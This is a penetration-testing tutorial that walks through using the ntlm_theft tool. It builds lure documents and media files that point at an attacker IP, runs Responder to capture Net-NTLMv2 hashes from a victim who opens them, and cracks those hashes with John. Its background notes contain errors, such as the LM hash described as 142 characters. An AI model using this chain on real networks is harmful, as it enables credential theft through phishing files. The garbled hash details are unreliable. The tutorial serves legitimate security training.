<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Multiple Files to Capture NTLM Hashes: NTLM Theft</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/multiple-files-to-capture-ntlm-hashes-ntlm-theft/" rel="bookmark"><time class="entry-date published" datetime="2022-01-15T14:50:40+00:00">January 15, 2022</time><time class="updated" datetime="2025-05-10T21:00:25+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Often while conducting penetration tests, attackers aim to escalate their privileges. Be it Kerberoasting or a simple lsass dump attack, stealing NTLM hashes always tops off the list of priorities in the said motive. And there exist various methods to do this using a plethora of tools, however, NTLM Theft is a tool that aggregates many of these attacks under one platform. We’ll discuss the tool in this article.</span></p>
<h3><span style="color: #800000;">Installation and Setup</span></h3>
<p><span style="color: #000000;">NTLM Theft can be found on github <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/Greenwolf/ntlm_theft">here</a></strong></span>. We must clone the repository and add one additional python3 package required to run an xlsx attack called xlsxwriter.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/Greenwolf/ntlm_theft
pip3 install xlsxwriter</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjBlOaNR3DmQCKVSz8L1sV1cHia1Uy0mH088Gy9Q9P1a5JmOHFqgb5aAn5PHadfFV1TuBWWGC_8HOHMAZBi2fiqprxey2s8fhm8pcwirjNuYtI4zMEimqEgpfMjD_xq1T2HQT3UdfloLEwMNwo_Rm9hHBVNSLX5MkfX00ZNuWcoIt2KpQlJuGV1BhVQjg=s16000"/></span></p>
<p><span style="color: #000000;">in the folder, you would find a python script. This is the tool we’d be running. But before that, allow me to share some fundamental theories about NTLM.</span></p>
<p><span style="color: #000000;"><strong>Windows Authentication: </strong>In the 1980s when people had jazz hair and funky boots, Microsoft wanted to use a fundamentally SSO algorithm to allow users to securely sign-on in to their systems. So, they allowed users to input a password and store it as <strong>LM Hash.</strong></span></p>
<p><span style="color: #000000;"><strong>LM Hash: </strong>It is a 142-character, character-insensitive hash which is stored in <strong>%SystemRoot%/system32/config/SAM </strong>file in a local system and <strong>%systemroot%\ntds.dit </strong>when the system is part of an Active Directory.</span></p>
<p><span style="color: #000000;"><strong>NT Hash</strong>: It is a modern version of the LM authentication protocol. <strong>NT Hash</strong> or commonly known as <strong>NTLM Hash</strong> is a full Unicode (65,536 characters) character-sensitive hash. It came out later to overcome the fundamental insecurity in LM protocol.</span></p>
<p><span style="color: #000000;"><strong>If NT is more recent, why does LM exist still? </strong>2 words– backwards compatibility. Many environments no longer need it and can disable the storage of that value.</span></p>
<p><span style="color: #000000;"><strong>Net-NTLMv1 and Net-NTLMv2</strong>: Their fundamental mechanism is the same as NThash, they just offer better brute-force protection, but still are very much crackable.</span></p>
<h3><span style="color: #800000;">Dumping NTLM hashes via docx file using NTLM Theft</span></h3>
<p><span style="color: #000000;">In this practical demonstration, we’ll be using a responder to dump Net-NTLMv2 hashes from a local Windows 10 machine using the NTLM Theft tool and crack them using John.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 ntlm_theft.py -g all -s 192.168.1.3 -f test</pre>
<p><span style="color: #000000;"><strong> </strong><strong>-g: </strong>generate. Here, we specify the file types (for related attacks) to generate</span></p>
<p><span style="color: #000000;"><strong>-s: </strong>server’s IP. here, the IP address of our Kali machine as that is where the responder will be running</span></p>
<p><span style="color: #000000;"><strong>-f: </strong>filename.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhGTIBa2QJ67Io1-gtD0gzs-uV9UwouH7xeqnoe5xlBN4UrMIG0vveVuUerPCH-cVdz1DxNkvLKeEPscEdq0BKFhhA292I_RC2HIdLLAWjvczAYVSKOsUJQPftypjwBwnw5jm9cntlvB213us0-Mf9X7JzFXoivgOaxsjaJiNcACYnuNhGyCvE0H7Bu0w=s16000"/></span></p>
<p><span style="color: #000000;">This would save all the files under the named directory “test”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgrtlxpEcHeyCz11upw2BT_if8yrQFVxTqXllFGM7Zl4vYz9_WOmtcUxNWSTDItV8Ya6-J0saFd-KYnup5nWmx7lscX6fFimPQdlvG0uE9ENEtInNZpHmGhVrLInSaAf_gnk8pjJl15hZ3SrkE3FDaXD-ZhPf6bJ9VQWFag79Tk7l-ypMznvN8AtW-syg=s16000"/></span></p>
<h5><strong><span style="color: #000000;">Exploiting the “IncludePicture” Functionality in DOCX</span></strong></h5>
<p><span style="color: #000000;">Now, as I have mentioned earlier, many attacks exist. We will be using the generated docx file to exploit “includepicture” functionality.</span></p>
<p><span style="color: #000000;">In older MS Word versions, selecting picture -&gt; clicking insert-&gt;picture-&gt;link to file allowed a user to input a link to desired image. The tools adds attacker’s IP in that field of docx file so that eventually the victim tries to connect to the attacker to fetch that image. That is when the responder comes into the equation.</span></p>
<h5><strong><span style="color: #000000;">Setting Up the Responder to Capture NTLM Hashes</span></strong></h5>
<p><span style="color: #000000;">Now, we will set up a responder on the eth0 interface.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">responder -I eth0</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj2fAQNPhFOGqGQLmcg2I3DB9TmwOqApVetEeKZCnH52hZMZPa3KOv5TRKEFcR4Q0f5AqXqnN9GSJz9g_pReuzrE66lXf0t9bK2B8K8gq2LPpQBZzlpRdvAcAFQtsIB14pZ5-RxPfPqGuS0HwloxoB87CI_DH1Gt4h6xrlzDRbF6TM2fjpsdF1cw8yJ6g=s16000"/></span></p>
<p><span style="color: #000000;">What the responder does is that when a client tries to connect (in this case, the victim tries to connect to my IP 192.168.1.3), it poisons LLMNR and NBT-NS and spoofs SMB requests in order to grab Net-NTLMv2 hashes.</span></p>
<p><span style="color: #000000;">So, now the victim opens the docx file that we sent to them using any medium and wait for them to open.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEizgwTp_sU-9NGC4y9ExL_lwC-VEDBSWVpklU_XYga6lkmluW5-h3WSPrBLPsW0whMPXzp4VdGFLOnpJVj6CGU-mwp_Gu86O84glM9IVv190Hh4KpgOuxi9AoOJShs_k7Ev1pV5s3c54fl3Bp9s6Z_WP-yE1tjlYxMhfmVtT7Dn0nKZwWLENNao9MCHbA=s16000"/></span></p>
<p><span style="color: #000000;">As the victim opens the docx file, we see the responder has successfully captured NTLMv2 hashes!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgvIOOFh1g_cahVjeNySi8uSM4dJN2XW7ZF7lcu7Us9McVXa26iQr62V6YLtbgTUbLqGIULelPAYy4unCHLaYvLrljtZB0AOpxLla8KoF3bLINXNgl4cPXq0n0EPHJK1mKy25rXQT1JlXkyPNEfDNE56vhEOZVP2v-OU4NF9UbXkwVbdNRKfLh7ea_hbQ=s16000"/></span></p>
<p><span style="color: #000000;">We can traverse our directory to /usr/share/responder/logs to find the output of the responder. We find our NTLM hashes in a text file called SMB-NTLMv2-SSP-192.168.1.133.txt (IPv4 version) and use john to crack NTLM hashes</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /usr/share/responder/logs
ls -al
john SMB-NTLMv2-SSP-192.168.1.133.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg_BVr3TYoGlGOA68YVy2blI9Xn4ruPvRBrJpSkJA-kYGGvUG5F4m3hXqO_tbRy7H5Ddv40CadUngAUi2BeiwjeJsBWxMsi05oVJkaxSuiVBfvjrgrka1BWWvrwvtJ9tcVEWs1OIDMDE55-a7wUQDf5suzfs8zRfuQ_J7vTINgt2BvMluai-bw4tOh8vQ=s16000"/></span></p>
<p><span style="color: #000000;">Just like that, we have successfully escalated our privileges!</span></p>
<p><span style="color: #000000;">We can repeat the same process and choose a different attack this time. Let us go with an audio file that will be opened in the Windows media player. We see the file “test.m3u” let’s send it to the victim and wait for him to open it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEji-YxMvbllfG6okuYhkoCqZuLB08u4-q4j4VnSBqsUvrW0BzQ3Tpzh1g4wTgA3AoKAd482SPZEDYGnwYhojHRFa5ScKyabN2R2oamUxb_vI-tFORAufPAEx5aUx_Pg45Tt_x3bF85ABl-6e5hsiEk1hlledqWQ5lA3230PnQ5uXw2qvnwra-oSajKRIQ=s16000"/></span></p>
<p><span style="color: #000000;">In our responder session, we see a log file has been created. We can use john to crack NTLM hashes we just captured using a different technique.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john SMB-NTLMv2-SSP-::ffff:192.168.1.133.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgmoHv4mnAn8s5XGmHwFaz-HQN94tUzzLgoZ57NSmdMurJiNfpav2qnHTfuuUGCV-5g5r6qetDSLuc-mtApgXwrddxd5e8M6NsjTqWkbsxw-RlkwST38gJOu1nrKqs_NlPxcAjxO9tNQZbS2KFWBtZ7NR6C32-3wFxxeBNH96Ir6FhKKPER5j6k0nD86g=s16000"/></span></p>
<p><span style="color: #000000;">But of course, you would also see various methods in the tool (files) which won’t run on modern versions of windows. For this, we can use a “modern” filter with ntlm theft tool that would only generate files that would run successful attacks on modern windows versions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 ntlm_theft.py -g modern -s 192.168.1.3 -f ignite</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjmNBVI1oAIZB7RJxrGrSSGOEf2MqMAiBHICYk4Hzkid5BwpBZCPHpB9OshrFkmvGZAIKYpMKVC1lH1z38lX00sPK6ssLEovL6z2iM7UbLTLBb6ZcVBmQ-4DiSwzZkw_wDz-oCmEk-THRkib4fPV0N_PYztDC_-ItRMOTvTzSIoqTo2pQp6IQCy2q6wDw=s16000"/></span></p>
<p><span style="color: #000000;">Or we can also specify the desired type of file for the attack for simplicity. Let’s say we only want to run an excel attack. We create this file using</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 ntlm_theft.py -g xlsx -s 192.168.1.3 -f demo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgtuDZ7szqnwXGM8E1InL6LDeUA5EOfWydVTaFg6Ps5b0BoH0_CkqABWOZcgXubQYDLtx_QlJUp-_w5Bgu5-lVUEibsPZ0gdjMEIqWayJVVfacGZ3MZF9Va3f2b59W2pb3p64_ON4NKaPLgLtC8qklRHTeGbX6aRSrpuT0n6D5kho8PrGylZFgQHOle1g=s16000"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">NTLM Theft tool saves the time of a penetration tester by readily creating many payloads that can be used to steal NTLM hashes of a system. This script relies on the responder to launch LLMNR and NBT poisoning attacks in order to steal NTLM hashes. Possible future development in the script could be adding this functionality of poisoning and making it a standalone tool for all NTLM needs. Having said that, it is very handy and highly recommended for internal PT and internal phishing simulations as SMB traffic is allowed within a domain. It can also be used with networks where a firewall allows SMB traffic to go out of their network. If you do find a network like that, do reach out! Thanks for reading.</span></p>
<p><span style="color: #000000;"><strong><span style="color: #800000;">Author</span>: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
